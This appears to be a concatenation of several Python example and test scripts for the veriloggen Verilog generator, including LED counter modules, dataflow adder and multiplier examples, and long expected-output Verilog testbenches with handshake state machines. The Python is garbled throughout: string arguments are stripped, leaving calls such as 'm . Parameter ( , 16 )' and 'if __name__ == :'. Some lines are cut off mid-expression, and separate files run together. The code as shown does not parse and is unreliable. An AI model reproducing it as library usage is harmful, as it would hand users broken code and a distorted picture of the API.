xfsm_22 = 22;\n  localparam xfsm_23 = 23;\n  localparam xfsm_24 = 24;\n\n  always @(posedge CLK) begin\n    if(RST) begin\n      xfsm <= xfsm_init;\n      _tmp_0 <= 0;\n    end else begin\n      case(xfsm)\n        xfsm_init: begin\n          xvalid <= 0;\n          if(reset_done) begin\n            xfsm <= xfsm_1;\n          end \n        end\n        xfsm_1: begin\n          xfsm <= xfsm_2;\n        end\n        xfsm_2: begin\n          xfsm <= xfsm_3;\n        end\n        xfsm_3: begin\n          xfsm <= xfsm_4;\n        end\n        xfsm_4: begin\n          xfsm <= xfsm_5;\n        end\n        xfsm_5: begin\n          xfsm <= xfsm_6;\n        end\n        xfsm_6: begin\n          xfsm <= xfsm_7;\n        end\n        xfsm_7: begin\n          xfsm <= xfsm_8;\n        end\n        xfsm_8: begin\n          xfsm <= xfsm_9;\n        end\n        xfsm_9: begin\n          xfsm <= xfsm_10;\n        end\n        xfsm_10: begin\n          xfsm <= xfsm_11;\n        end\n        xfsm_11: begin\n          xvalid <= 1;\n          xfsm <= xfsm_12;\n        end\n        xfsm_12: begin\n          if(xready) begin\n            xdata <= xdata + 1;\n          end \n          if(xready) begin\n            _tmp_0 <= _tmp_0 + 1;\n          end \n          if((_tmp_0 == 5) && xready) begin\n            xfsm <= xfsm_13;\n          end \n        end\n        xfsm_13: begin\n          xvalid <= 0;\n          xfsm <= xfsm_14;\n        end\n        xfsm_14: begin\n          xfsm <= xfsm_15;\n        end\n        xfsm_15: begin\n          xfsm <= xfsm_16;\n        end\n        xfsm_16: begin\n          xfsm <= xfsm_17;\n        end\n        xfsm_17: begin\n          xfsm <= xfsm_18;\n        end\n        xfsm_18: begin\n          xfsm <= xfsm_19;\n        end\n        xfsm_19: begin\n          xfsm <= xfsm_20;\n        end\n        xfsm_20: begin\n          xfsm <= xfsm_21;\n        end\n        xfsm_21: begin\n          xfsm <= xfsm_22;\n        end\n        xfsm_22: begin\n          xfsm <= xfsm_23;\n        end\n        xfsm_23: begin\n          xvalid <= 1;\n          if(xready) begin\n            xdata <= xdata + 1;\n          end \n          if(xready) begin\n            _tmp_0 <= _tmp_0 + 1;\n          end \n          if((_tmp_0 == 10) && xready) begin\n            xfsm <= xfsm_24;\n          end \n        end\n        xfsm_24: begin\n          xvalid <= 0;\n        end\n      endcase\n    end\n  end\n\n  reg [32-1:0] yfsm;\n  localparam yfsm_init = 0;\n  reg [32-1:0] _tmp_1;\n  localparam yfsm_1 = 1;\n  localparam yfsm_2 = 2;\n  localparam yfsm_3 = 3;\n  localparam yfsm_4 = 4;\n  localparam yfsm_5 = 5;\n  localparam yfsm_6 = 6;\n  localparam yfsm_7 = 7;\n  localparam yfsm_8 = 8;\n  localparam yfsm_9 = 9;\n  localparam yfsm_10 = 10;\n  localparam yfsm_11 = 11;\n  localparam yfsm_12 = 12;\n  localparam yfsm_13 = 13;\n  localparam yfsm_14 = 14;\n  localparam yfsm_15 = 15;\n  localparam yfsm_16 = 16;\n  localparam yfsm_17 = 17;\n  localparam yfsm_18 = 18;\n  localparam yfsm_19 = 19;\n  localparam yfsm_20 = 20;\n  localparam yfsm_21 = 21;\n  localparam yfsm_22 = 22;\n  localparam yfsm_23 = 23;\n  localparam yfsm_24 = 24;\n  localparam yfsm_25 = 25;\n  localparam yfsm_26 = 26;\n  localparam yfsm_27 = 27;\n  localparam yfsm_28 = 28;\n  localparam yfsm_29 = 29;\n  localparam yfsm_30 = 30;\n  localparam yfsm_31 = 31;\n  localparam yfsm_32 = 32;\n  localparam yfsm_33 = 33;\n  localparam yfsm_34 = 34;\n  localparam yfsm_35 = 35;\n  localparam yfsm_36 = 36;\n  localparam yfsm_37 = 37;\n  localparam yfsm_38 = 38;\n  localparam yfsm_39 = 39;\n  localparam yfsm_40 = 40;\n  localparam yfsm_41 = 41;\n  localparam yfsm_42 = 42;\n  localparam yfsm_43 = 43;\n  localparam yfsm_44 = 44;\n\n  always @(posedge CLK) begin\n    if(RST) begin\n      yfsm <= yfsm_init;\n      _tmp_1 <= 0;\n    end else begin\n      case(yfsm)\n        yfsm_init: begin\n          yvalid <= 0;\n          if(reset_done) begin\n            yfsm <= yfsm_1;\n          end \n        end\n        yfsm_1: begin\n          yfsm <= yfsm_2;\n        end\n        yfsm_2: begin\n          yfsm <= yfsm_3;\n        end\n        yfsm_3: begin\n          yfsm <= yfsm_4;\n        end\n        yfsm_4: begin\n          yfsm <= yfsm_5;\n        end\n        yfsm_5: begin\n          yfsm <= yfsm_6;\n        end\n        yfsm_6: begin\n          yfsm <= yfsm_7;\n        end\n        yfsm_7: begin\n          yfsm <= yfsm_8;\n        end\n        yfsm_8: begin\n          yfsm <= yfsm_9;\n        end\n        yfsm_9: begin\n          yfsm <= yfsm_10;\n        end\n        yfsm_10: begin\n          yfsm <= yfsm_11;\n        end\n        yfsm_11: begin\n          yfsm <= yfsm_12;\n        end\n        yfsm_12: begin\n          yfsm <= yfsm_13;\n        end\n        yfsm_13: begin\n          yfsm <= yfsm_14;\n        end\n        yfsm_14: begin\n          yfsm <= yfsm_15;\n        end\n        yfsm_15: begin\n          yfsm <= yfsm_16;\n        end\n        yfsm_16: begin\n          yfsm <= yfsm_17;\n        end\n        yfsm_17: begin\n          yfsm <= yfsm_18;\n        end\n        yfsm_18: begin\n          yfsm <= yfsm_19;\n        end\n        yfsm_19: begin\n          yfsm <= yfsm_20;\n        end\n        yfsm_20: begin\n          yfsm <= yfsm_21;\n        end\n        yfsm_21: begin\n          yvalid <= 1;\n          yfsm <= yfsm_22;\n        end\n        yfsm_22: begin\n          if(yready) begin\n            ydata <= ydata + 2;\n          end \n          if(yready) begin\n            _tmp_1 <= _tmp_1 + 1;\n          end \n          if((_tmp_1 == 5) && yready) begin\n            yfsm <= yfsm_23;\n          end \n        end\n        yfsm_23: begin\n          yvalid <= 0;\n          yfsm <= yfsm_24;\n        end\n        yfsm_24: begin\n          yfsm <= yfsm_25;\n        end\n        yfsm_25: begin\n          yfsm <= yfsm_26;\n        end\n        yfsm_26: begin\n          yfsm <= yfsm_27;\n        end\n        yfsm_27: begin\n          yfsm <= yfsm_28;\n        end\n        yfsm_28: begin\n          yfsm <= yfsm_29;\n        end\n        yfsm_29: begin\n          yfsm <= yfsm_30;\n        end\n        yfsm_30: begin\n          yfsm <= yfsm_31;\n        end\n        yfsm_31: begin\n          yfsm <= yfsm_32;\n        end\n        yfsm_32: begin\n          yfsm <= yfsm_33;\n        end\n        yfsm_33: begin\n          yfsm <= yfsm_34;\n        end\n        yfsm_34: begin\n          yfsm <= yfsm_35;\n        end\n        yfsm_35: begin\n          yfsm <= yfsm_36;\n        end\n        yfsm_36: begin\n          yfsm <= yfsm_37;\n        end\n        yfsm_37: begin\n          yfsm <= yfsm_38;\n        end\n        yfsm_38: begin\n          yfsm <= yfsm_39;\n        end\n        yfsm_39: begin\n          yfsm <= yfsm_40;\n        end\n        yfsm_40: begin\n          yfsm <= yfsm_41;\n        end\n        yfsm_41: begin\n          yfsm <= yfsm_42;\n        end\n        yfsm_42: begin\n          yfsm <= yfsm_43;\n        end\n        yfsm_43: begin\n          yvalid <= 1;\n          if(yready) begin\n            ydata <= ydata + 2;\n          end \n          if(yready) begin\n            _tmp_1 <= _tmp_1 + 1;\n          end \n          if((_tmp_1 == 10) && yready) begin\n            yfsm <= yfsm_44;\n          end \n        end\n        yfsm_44: begin\n          yvalid <= 0;\n        end\n      endcase\n    end\n  end\n\n  reg [32-1:0] zfsm;\n  localparam zfsm_init = 0;\n  localparam zfsm_1 = 1;\n  localparam zfsm_2 = 2;\n  localparam zfsm_3 = 3;\n  localparam zfsm_4 = 4;\n  localparam zfsm_5 = 5;\n  localparam zfsm_6 = 6;\n  localparam zfsm_7 = 7;\n  localparam zfsm_8 = 8;\n\n  always @(posedge CLK) begin\n    if(RST) begin\n      zfsm <= zfsm_init;\n    end else begin\n      case(zfsm)\n        zfsm_init: begin\n          zready <= 0;\n          if(reset_done) begin\n            zfsm <= zfsm_1;\n          end \n        end\n        zfsm_1: begin\n          zfsm <= zfsm_2;\n        end\n        zfsm_2: begin\n          if(zvalid) begin\n            zready <= 1;\n          end \n          if(zvalid) begin\n            zfsm <= zfsm_3;\n          end \n        end\n        zfsm_3: begin\n          zready <= 0;\n          zfsm <= zfsm_4;\n        end\n        zfsm_4: begin\n          zready <= 0;\n          zfsm <= zfsm_5;\n        end\n        zfsm_5: begin\n          zready <= 0;\n          zfsm <= zfsm_6;\n        end\n        zfsm_6: begin\n          zready <= 0;\n          zfsm <= zfsm_7;\n        end\n        zfsm_7: begin\n          zready <= 0;\n          zfsm <= zfsm_8;\n        end\n        zfsm_8: begin\n          zfsm <= zfsm_2;\n        end\n      endcase\n    end\n  end\n\n\n  always @(posedge CLK) begin\n    if(reset_done) begin\n      if(xvalid && xready) begin\n        $display("xdata=%d", xdata);\n      end \n      if(yvalid && yready) begin\n        $display("ydata=%d", ydata);\n      end \n      if(zvalid && zready) begin\n        $display("zdata=%d", zdata);\n      end \n    end \n  end\n\n\nendmodule\n\n\n\nmodule main\n(\n  input CLK,\n  input RST,\n  input [32-1:0] xdata,\n  input xvalid,\n  output xready,\n  input [32-1:0] ydata,\n  input yvalid,\n  output yready,\n  output [32-1:0] zdata,\n  output zvalid,\n  input zready\n);\n\n  reg [32-1:0] _tmp_data_0;\n  reg _tmp_valid_0;\n  wire _tmp_ready_0;\n  assign xready = (_tmp_ready_0 || !_tmp_valid_0) && (xvalid && yvalid);\n  assign yready = (_tmp_ready_0 || !_tmp_valid_0) && (xvalid && yvalid);\n  assign zdata = _tmp_data_0;\n  assign zvalid = _tmp_valid_0;\n  assign _tmp_ready_0 = zready;\n\n  always @(posedge CLK) begin\n    if(RST) begin\n      _tmp_data_0 <= 0;\n      _tmp_valid_0 <= 0;\n    end else begin\n      if((_tmp_ready_0 || !_tmp_valid_0) && (xready && yready) && (xvalid && yvalid)) begin\n        _tmp_data_0 <= xdata + ydata;\n      end \n      if(_tmp_valid_0 && _tmp_ready_0) begin\n        _tmp_valid_0 <= 0;\n      end \n      if((_tmp_ready_0 || !_tmp_valid_0) && (xready && yready)) begin\n        _tmp_valid_0 <= xvalid && yvalid;\n      end \n    end\n  end\n\n\nendmodule\n""" \n 
\n 
def test ( ) : \n 
~~~ test_module = dataflow_example . mkTest ( ) \n 
code = test_module . to_verilog ( ) \n 
\n 
from pyverilog . vparser . parser import VerilogParser \n 
from pyverilog . ast_code_generator . codegen import ASTCodeGenerator \n 
parser = VerilogParser ( ) \n 
expected_ast = parser . parse ( expected_verilog ) \n 
codegen = ASTCodeGenerator ( ) \n 
expected_code = codegen . visit ( expected_ast ) \n 
\n 
assert ( expected_code == code ) \n 
~~ from __future__ import absolute_import \n 
from __future__ import print_function \n 
import sys \n 
import os \n 
\n 
# the next line can be removed after installation \n 
sys . path . insert ( 0 , os . path . dirname ( os . path . dirname ( os . path . dirname ( os . path . abspath ( __file__ ) ) ) ) ) \n 
\n 
from veriloggen import * \n 
\n 
def mkLed ( ) : \n 
~~~ m = Module ( ) \n 
interval = m . Parameter ( , 16 ) \n 
clk = m . Input ( ) \n 
rst = m . Input ( ) \n 
led = m . OutputReg ( , 8 , initval = 0 ) \n 
count = m . Reg ( , 32 , initval = 0 ) \n 
\n 
seq = Seq ( m , , clk , rst ) \n 
seq . add ( Systask ( , , led , count ) ) \n 
seq . add ( count ( count + 1 ) , cond = count < interval - 1 ) \n 
seq . add ( count ( 0 ) , cond = count == interval - 1 ) \n 
seq . add ( led ( led + 1 ) , cond = count == interval - 1 ) \n 
\n 
seq . make_always ( ) \n 
\n 
return m \n 
\n 
~~ def mkTest ( ) : \n 
~~~ m = Module ( ) \n 
\n 
# target instance \n 
led = mkLed ( ) \n 
\n 
# copy paras and ports \n 
params = m . copy_params ( led ) \n 
ports = m . copy_sim_ports ( led ) \n 
\n 
clk = ports [ ] \n 
rst = ports [ ] \n 
\n 
uut = m . Instance ( led , , \n 
params = m . connect_params ( led ) , \n 
ports = m . connect_ports ( led ) ) \n 
\n 
#simulation.setup_waveform(m, uut) \n 
simulation . setup_clock ( m , clk , hperiod = 5 ) \n 
init = simulation . setup_reset ( m , rst , m . make_reset ( ) , period = 100 ) \n 
\n 
init . add ( \n 
Delay ( 1000 ) , \n 
Systask ( ) , \n 
) \n 
\n 
return m \n 
\n 
~~ if __name__ == : \n 
~~~ test = mkTest ( ) \n 
verilog = test . to_verilog ( ) \n 
print ( verilog ) \n 
~~ from __future__ import absolute_import \n 
from __future__ import print_function \n 
import sys \n 
import os \n 
\n 
# the next line can be removed after installation \n 
sys . path . insert ( 0 , os . path . dirname ( os . path . dirname ( os . path . dirname ( os . path . dirname ( os . path . abspath ( __file__ \n 
from veriloggen import * \n 
\n 
def mkLed ( ) : \n 
~~~ m = Module ( ) \n 
width = m . Parameter ( , 8 ) \n 
clk = m . Input ( ) \n 
rst = m . Input ( ) \n 
led = m . OutputReg ( , width ) \n 
count = m . Reg ( , 32 ) \n 
\n 
m . Always ( Posedge ( clk ) ) ( \n 
If ( rst ) ( \n 
count ( 0 ) \n 
) . Else ( \n 
count ( Cond ( count == 1023 , 0 , count + 1 ) ) \n 
) ) \n 
\n 
m . Always ( Posedge ( clk ) ) ( \n 
If ( rst ) ( \n 
led ( 0 ) \n 
) . Else ( \n 
led ( Cond ( count == 1024 - 1 , led + 1 , led ) ) \n 
) ) \n 
\n 
return m \n 
\n 
~~ if __name__ == : \n 
~~~ led = mkLed ( ) \n 
verilog = led . to_verilog ( ) \n 
print ( verilog ) \n 
~~ from __future__ import absolute_import \n 
from __future__ import print_function \n 
import sys \n 
import os \n 
\n 
# the next line can be removed after installation \n 
sys . path . insert ( 0 , os . path . dirname ( os . path . dirname ( os . path . dirname ( os . path . dirname ( os . path . dirname ( os \n 
from veriloggen import * \n 
\n 
def mkSub ( ) : \n 
~~~ m = Module ( ) \n 
clk = m . Input ( ) \n 
rst = m . Input ( ) \n 
count = m . OutputReg ( , 32 ) \n 
m . Always ( Posedge ( clk ) ) ( \n 
If ( rst ) ( \n 
count ( 0 ) \n 
) . Else ( \n 
If ( count == 1023 ) ( \n 
count ( 0 ) \n 
) . Else ( \n 
count ( count + 1 ) \n 
) \n 
) ) \n 
return m \n 
\n 
~~ def mkLed ( ) : \n 
~~~ m = Module ( ) \n 
width = m . Parameter ( , 8 ) \n 
clk = m . Input ( ) \n 
rst = m . Input ( ) \n 
led = m . OutputReg ( , width ) \n 
count = m . Wire ( , 32 ) \n 
\n 
sub = mkSub ( ) \n 
m . Instance ( sub , , m . connect_params ( sub ) , m . connect_ports ( sub ) ) \n 
\n 
m . Always ( Posedge ( clk ) ) ( \n 
If ( rst ) ( \n 
led ( 0 ) \n 
) . Else ( \n 
If ( count == 1023 ) ( \n 
led ( led + 1 ) \n 
) \n 
) ) \n 
\n 
# by multiple definition, throws an exception here \n 
inst_sub = m . Reg ( , 32 ) \n 
\n 
return m \n 
\n 
~~ if __name__ == : \n 
~~~ try : \n 
~~~ led = mkLed ( ) \n 
~~ except ValueError as e : \n 
~~~ print ( e . args [ 0 ] ) \n 
print ( ) \n 
sys . exit ( ) \n 
\n 
~~ raise ValueError ( "Multiple definition was not detected." ) \n 
\n 
#verilog = led.to_verilog() \n 
#print(verilog) \n 
~~ from __future__ import absolute_import \n 
from __future__ import print_function \n 
import sys \n 
import os \n 
\n 
# the next line can be removed after installation \n 
sys . path . insert ( 0 , os . path . dirname ( os . path . dirname ( os . path . dirname ( os . path . dirname ( os . path . abspath ( __file__ \n 
from veriloggen import * \n 
\n 
def mkLed ( ) : \n 
~~~ m = Module ( ) \n 
width = m . Parameter ( , 8 ) \n 
clk = m . Input ( ) \n 
rst = m . Input ( ) \n 
led = m . OutputReg ( , width ) \n 
count = m . Reg ( , 32 ) \n 
\n 
m . Always ( Posedge ( clk ) ) ( \n 
If ( rst ) ( \n 
count ( 0 ) \n 
) . Else ( \n 
If ( count == 1023 ) ( \n 
count ( 0 ) \n 
) . Else ( \n 
count ( count + 1 ) \n 
) \n 
) ) \n 
\n 
m . Always ( Posedge ( clk ) ) ( \n 
If ( rst ) ( \n 
led ( 0 ) \n 
) . Else ( \n 
If ( count == 1024 - 1 ) ( \n 
led ( led + 1 ) , \n 
\n 
SingleStatement ( SystemTask ( , , led ) ) \n 
) \n 
) ) \n 
\n 
return m \n 
\n 
~~ if __name__ == : \n 
~~~ led = mkLed ( ) \n 
verilog = led . to_verilog ( ) \n 
print ( verilog ) \n 
~~ from __future__ import absolute_import \n 
from __future__ import print_function \n 
import sys \n 
import os \n 
\n 
# the next line can be removed after installation \n 
sys . path . insert ( 0 , os . path . dirname ( os . path . dirname ( os . path . dirname ( os . path . dirname ( os . path . dirname ( os \n 
from veriloggen import * \n 
import veriloggen . dataflow as dataflow \n 
\n 
def mkMain ( ) : \n 
# input variiable \n 
~~~ x = dataflow . Variable ( , valid = , ready = , point = 8 ) \n 
y = dataflow . Variable ( , valid = , ready = , point = 4 ) \n 
\n 
# dataflow definition \n 
z = x * y \n 
\n 
# set output attribute \n 
z . output ( , valid = , ready = ) \n 
\n 
df = dataflow . Dataflow ( z ) \n 
m = df . to_module ( ) \n 
\n 
return m \n 
\n 
~~ def mkTest ( ) : \n 
~~~ m = Module ( ) \n 
\n 
# target instance \n 
main = mkMain ( ) \n 
\n 
params = m . copy_params ( main ) \n 
ports = m . copy_sim_ports ( main ) \n 
\n 
clk = ports [ ] \n 
rst = ports [ ] \n 
\n 
xdata = ports [ ] \n 
xvalid = ports [ ] \n 
xready = ports [ ] \n 
\n 
ydata = ports [ ] \n 
yvalid = ports [ ] \n 
yready = ports [ ] \n 
\n 
zdata = ports [ ] \n 
zvalid = ports [ ] \n 
zready = ports [ ] \n 
\n 
xdata_orig = m . RegLike ( ports [ ] , name = , initval = 0 ) \n 
ydata_orig = m . RegLike ( ports [ ] , name = , initval = 0 ) \n 
zdata_orig = m . WireLike ( ports [ ] , name = ) \n 
m . Always ( ) ( xdata ( fixed . to_fixed ( xdata_orig , 8 ) ) ) \n 
m . Always ( ) ( ydata ( fixed . to_fixed ( ydata_orig , 4 ) ) ) \n 
m . Assign ( zdata_orig ( fixed . fixed_to_int ( zdata , 8 ) ) ) \n 
\n 
uut = m . Instance ( main , , \n 
params = m . connect_params ( main ) , \n 
ports = m . connect_ports ( main ) ) \n 
\n 
reset_done = m . Reg ( , initval = 0 ) \n 
reset_stmt = [ ] \n 
reset_stmt . append ( reset_done ( 0 ) ) \n 
reset_stmt . append ( xdata ( 0 ) ) \n 
reset_stmt . append ( xvalid ( 0 ) ) \n 
reset_stmt . append ( ydata ( 0 ) ) \n 
reset_stmt . append ( yvalid ( 0 ) ) \n 
reset_stmt . append ( zready ( 0 ) ) \n 
reset_stmt . append ( xdata_orig ( 0 ) ) \n 
reset_stmt . append ( ydata_orig ( 0 ) ) \n 
\n 
simulation . setup_waveform ( m , uut , xdata_orig , ydata_orig , zdata_orig ) \n 
simulation . setup_clock ( m , clk , hperiod = 5 ) \n 
init = simulation . setup_reset ( m , rst , reset_stmt , period = 100 ) \n 
\n 
nclk = simulation . next_clock \n 
\n 
init . add ( \n 
Delay ( 1000 ) , \n 
reset_done ( 1 ) , \n 
nclk ( clk ) , \n 
Delay ( 10000 ) , \n 
Systask ( ) , \n 
) \n 
\n 
def send ( name , data , valid , ready , step = 1 , waitnum = 10 ) : \n 
~~~ fsm = FSM ( m , name + , clk , rst ) \n 
count = m . TmpReg ( 32 , initval = 0 ) \n 
\n 
fsm . add ( valid ( 0 ) ) \n 
fsm . goto_next ( cond = reset_done ) \n 
for _ in range ( waitnum ) : \n 
~~~ fsm . goto_next ( ) \n 
\n 
~~ fsm . add ( valid ( 1 ) ) \n 
fsm . goto_next ( ) \n 
\n 
fsm . add ( data ( data + step ) , cond = ready ) \n 
fsm . add ( count . inc ( ) , cond = ready ) \n 
fsm . add ( valid ( 0 ) , cond = AndList ( count == 5 , ready ) ) \n 
fsm . goto_next ( cond = AndList ( count == 5 , ready ) ) \n 
\n 
for _ in range ( waitnum ) : \n 
~~~ fsm . goto_next ( ) \n 
~~ fsm . add ( valid ( 1 ) ) \n 
\n 
fsm . add ( data ( data + step ) , cond = ready ) \n 
fsm . add ( count . inc ( ) , cond = ready ) \n 
fsm . add ( valid ( 0 ) , cond = AndList ( count == 10 , ready ) ) \n 
fsm . goto_next ( cond = AndList ( count == 10 , ready ) ) \n 
\n 
fsm . make_always ( ) \n 
\n 
\n 
~~ def receive ( name , data , valid , ready , waitnum = 10 ) : \n 
~~~ fsm = FSM ( m , name + , clk , rst ) \n 
\n 
fsm . add ( ready ( 0 ) ) \n 
fsm . goto_next ( cond = reset_done ) \n 
fsm . goto_next ( ) \n 
\n 
yinit = fsm . current ( ) \n 
fsm . add ( ready ( 1 ) , cond = valid ) \n 
fsm . goto_next ( cond = valid ) \n 
for i in range ( waitnum ) : \n 
~~~ fsm . add ( ready ( 0 ) ) \n 
fsm . goto_next ( ) \n 
\n 
~~ fsm . goto ( yinit ) \n 
\n 
fsm . make_always ( ) \n 
\n 
\n 
~~ send ( , xdata_orig , xvalid , xready , step = 1 , waitnum = 10 ) \n 
send ( , ydata_orig , yvalid , yready , step = 1 , waitnum = 20 ) \n 
receive ( , zdata , zvalid , zready , waitnum = 50 ) \n 
\n 
m . Always ( Posedge ( clk ) ) ( \n 
If ( reset_done ) ( \n 
If ( AndList ( xvalid , xready ) ) ( \n 
Systask ( , , xdata_orig ) \n 
) , \n 
If ( AndList ( yvalid , yready ) ) ( \n 
Systask ( , , ydata_orig ) \n 
) , \n 
If ( AndList ( zvalid , zready ) ) ( \n 
Systask ( , , zdata_orig ) \n 
) \n 
) \n 
) \n 
\n 
return m \n 
\n 
\n 
~~ if __name__ == : \n 
~~~ test = mkTest ( ) \n 
verilog = test . to_verilog ( ) \n 
print ( verilog ) \n 
\n 
# run simulator (Icarus Verilog) \n 
sim = simulation . Simulator ( test ) \n 
rslt = sim . run ( ) # display=False \n 
#rslt = sim.run(display=True) \n 
print ( rslt ) \n 
\n 
# launch waveform viewer (GTKwave) \n 
#sim.view_waveform() # background=False \n 
#sim.view_waveform(background=True) \n 
~~ from __future__ import absolute_import \n 
from __future__ import print_function \n 
import dataflow_mul \n 
\n 
expected_verilog = """\nmodule test;\n\n  reg CLK;\n  reg RST;\n  reg [32-1:0] xdata;\n  reg xvalid;\n  wire xready;\n  reg [32-1:0] ydata;\n  reg yvalid;\n  wire yready;\n  wire [32-1:0] zdata;\n  wire zvalid;\n  reg zready;\n\n  main\n  uut\n  (\n    .CLK(CLK),\n    .RST(RST),\n    .xdata(xdata),\n    .xvalid(xvalid),\n    .xready(xready),\n    .ydata(ydata),\n    .yvalid(yvalid),\n    .yready(yready),\n    .zdata(zdata),\n    .zvalid(zvalid),\n    .zready(zready)\n  );\n\n  reg reset_done;\n\n  initial begin\n    $dumpfile("uut.vcd");\n    $dumpvars(0, uut);\n  end\n\n\n  initial begin\n    CLK = 0;\n    forever begin\n      #5 CLK = !CLK;\n    end\n  end\n\n\n  initial begin\n    RST = 0;\n    reset_done = 0;\n    xdata = 0;\n    xvalid = 0;\n    ydata = 0;\n    yvalid = 0;\n    zready = 0;\n    #100;\n    RST = 1;\n    #100;\n    RST = 0;\n    #1000;\n    reset_done = 1;\n    @(posedge CLK);\n    #1;\n    #10000;\n    $finish;\n  end\n\n  reg [32-1:0] xfsm;\n  localparam xfsm_init = 0;\n  reg [32-1:0] _tmp_0;\n  localparam xfsm_1 = 1;\n  localparam xfsm_2 = 2;\n  localparam xfsm_3 = 3;\n  localparam xfsm_4 = 4;\n  localparam xfsm_5 = 5;\n  localparam xfsm_6 = 6;\n  localparam xfsm_7 = 7;\n  localparam xfsm_8 = 8;\n  localparam xfsm_9 = 9;\n  localparam xfsm_10 = 10;\n  localparam xfsm_11 = 11;\n  localparam xfsm_12 = 12;\n  localparam xfsm_13 = 13;\n  localparam xfsm_14 = 14;\n  localparam xfsm_15 = 15;\n  localparam xfsm_16 = 16;\n  localparam xfsm_17 = 17;\n  localparam xfsm_18 = 18;\n  localparam xfsm_19 = 19;\n  localparam xfsm_20 = 20;\n  localparam xfsm_21 = 21;\n  localparam xfsm_22 = 22;\n  localparam xfsm_23 = 23;\n  localparam xfsm_24 = 24;\n\n  always @(posedge CLK) begin\n    if(RST) begin\n      xfsm <= xfsm_init;\n      _tmp_0 <= 0;\n    end else begin\n      case(xfsm)\n        xfsm_init: begin\n          xvalid <= 0;\n          if(reset_done) begin\n            xfsm <= xfsm_1;\n          end \n        end\n        xfsm_1: begin\n          xfsm <= xfsm_2;\n        end\n        xfsm_2: begin\n          xfsm <= xfsm_3;\n        end\n        xfsm_3: begin\n          xfsm <= xfsm_4;\n        end\n        xfsm_4: begin\n          xfsm <= xfsm_5;\n        end\n        xfsm_5: begin\n          xfsm <= xfsm_6;\n        end\n        xfsm_6: begin\n          xfsm <= xfsm_7;\n        end\n        xfsm_7: begin\n          xfsm <= xfsm_8;\n        end\n        xfsm_8: begin\n          xfsm <= xfsm_9;\n        end\n        xfsm_9: begin\n          xfsm <= xfsm_10;\n        end\n        xfsm_10: begin\n          xfsm <= xfsm_11;\n        end\n        xfsm_11: begin\n          xvalid <= 1;\n          xfsm <= xfsm_12;\n        end\n        xfsm_12: begin\n          if(xready) begin\n            xdata <= xdata + 1;\n          end \n          if(xready) begin\n            _tmp_0 <= _tmp_0 + 1;\n          end \n          if((_tmp_0 == 5) && xready) begin\n            xvalid <= 0;\n          end \n          if((_tmp_0 == 5) && xready) begin\n            xfsm <= xfsm_13;\n          end \n        end\n        xfsm_13: begin\n          xfsm <= xfsm_14;\n        end\n        xfsm_14: begin\n          xfsm <= xfsm_15;\n        end\n        xfsm_15: begin\n          xfsm <= xfsm_16;\n        end\n        xfsm_16: begin\n          xfsm <= xfsm_17;\n        end\n        xfsm_17: begin\n          xfsm <= xfsm_18;\n        end\n        xfsm_18: begin\n          xfsm <= xfsm_19;\n        end\n        xfsm_19: begin\n          xfsm <= xfsm_20;\n        end\n        xfsm_20: begin\n          xfsm <= xfsm_21;\n        end\n        xfsm_21: begin\n          xfsm <= xfsm_22;\n        end\n        xfsm_22: begin\n          xfsm <= xfsm_23;\n        end\n        xfsm_23: begin\n          xvalid <= 1;\n          if(xready) begin\n            xdata <= xdata + 1;\n          end \n          if(xready) begin\n            _tmp_0 <= _tmp_0 + 1;\n          end \n          if((_tmp_0 == 10) && xready) begin\n            xvalid <= 0;\n          end \n          if((_tmp_0 == 10) && xready) begin\n            xfsm <= xfsm_24;\n          end \n        end\n      endcase\n    end\n  end\n\n  reg [32-1:0] yfsm;\n  localparam yfsm_init = 0;\n  reg [32-1:0] _tmp_1;\n  localparam yfsm_1 = 1;\n  localparam yfsm_2 = 2;\n  localparam yfsm_3 = 3;\n  localparam yfsm_4 = 4;\n  localparam yfsm_5 = 5;\n  localparam yfsm_6 = 6;\n  localparam yfsm_7 = 7;\n  localparam yfsm_8 = 8;\n  localparam yfsm_9 = 9;\n  localparam yfsm_10 = 10;\n  localparam yfsm_11 = 11;\n  localparam yfsm_12 = 12;\n  localparam yfsm_13 = 13;\n  localparam yfsm_14 = 14;\n  localparam yfsm_15 = 15;\n  localparam yfsm_16 = 16;\n  localparam yfsm_17 = 17;\n  localparam yfsm_18 = 18;\n  localparam yfsm_19 = 19;\n  localparam yfsm_20 = 20;\n  localparam yfsm_21 = 21;\n  localparam yfsm_22 = 22;\n  localparam yfsm_23 = 23;\n  localparam yfsm_24 = 24;\n  localparam yfsm_25 = 25;\n  localparam yfsm_26 = 26;\n  localparam yfsm_27 = 27;\n  localparam yfsm_28 = 28;\n  localparam yfsm_29 = 29;\n  localparam yfsm_30 = 30;\n  localparam yfsm_31 = 31;\n  localparam yfsm_32 = 32;\n  localparam yfsm_33 = 33;\n  localparam yfsm_34 = 34;\n  localparam yfsm_35 = 35;\n  localparam yfsm_36 = 36;\n  localparam yfsm_37 = 37;\n  localparam yfsm_38 = 38;\n  localparam yfsm_39 = 39;\n  localparam yfsm_40 = 40;\n  localparam yfsm_41 = 41;\n  localparam yfsm_42 = 42;\n  localparam yfsm_43 = 43;\n  localparam yfsm_44 = 44;\n\n  always @(posedge CLK) begin\n    if(RST) begin\n      yfsm <= yfsm_init;\n      _tmp_1 <= 0;\n    end else begin\n      case(yfsm)\n        yfsm_init: begin\n          yvalid <= 0;\n          if(reset_done) begin\n            yfsm <= yfsm_1;\n          end \n        end\n        yfsm_1: begin\n          yfsm <= yfsm_2;\n        end\n        yfsm_2: begin\n          yfsm <= yfsm_3;\n        end\n        yfsm_3: begin\n          yfsm <= yfsm_4;\n        end\n        yfsm_4: begin\n          yfsm <= yfsm_5;\n        end\n        yfsm_5: begin\n          yfsm <= yfsm_6;\n        end\n        yfsm_6: begin\n          yfsm <= yfsm_7;\n        end\n        yfsm_7: begin\n          yfsm <= yfsm_8;\n        end\n        yfsm_8: begin\n          yfsm <= yfsm_9;\n        end\n        yfsm_9: begin\n          yfsm <= yfsm_10;\n        end\n        yfsm_10: begin\n          yfsm <= yfsm_11;\n        end\n        yfsm_11: begin\n          yfsm <= yfsm_12;\n        end\n        yfsm_12: begin\n          yfsm <= yfsm_13;\n        end\n        yfsm_13: begin\n          yfsm <= yfsm_14;\n        end\n        yfsm_14: begin\n          yfsm <= yfsm_15;\n        end\n        yfsm_15: begin\n          yfsm <= yfsm_16;\n        end\n        yfsm_16: begin\n          yfsm <= yfsm_17;\n        end\n        yfsm_17: begin\n          yfsm <= yfsm_18;\n        end\n        yfsm_18: begin\n          yfsm <= yfsm_19;\n        end\n        yfsm_19: begin\n          yfsm <= yfsm_20;\n        end\n        yfsm_20: begin\n          yfsm <= yfsm_21;\n        end\n        